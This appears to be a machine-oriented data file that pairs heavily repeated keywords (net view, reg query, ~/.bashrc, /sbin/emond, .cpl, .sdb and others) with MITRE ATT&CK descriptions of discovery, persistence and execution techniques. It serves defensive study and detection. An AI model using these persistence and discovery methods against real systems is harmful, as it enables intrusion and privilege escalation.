net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
 net share
Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. 

File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
reg query
Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
netstat 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net use 
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
 net session
Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. 

An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.

Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), "net use," and "net session" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to "net session". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
capture webcam data 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
 capture video 
An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.

In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
launchctl
Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)

Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w "%s/Library/LaunchAgents/%s"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)

~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
~/.bashrc 
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
 rc.local
Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. 

Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. 

For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
AppleScript
Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e "script here"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)

AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.

Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
/sbin/emond 
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
 emond
Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.

The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
CPL files
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
.cpl
Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)

Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.

Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
application shim
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
.sdb
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)

Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. 

A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:

* <code>%WINDIR%\AppPatch\sysmain.sdb</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>

Custom databases are stored in:

* <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> and
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>

To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).

Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.
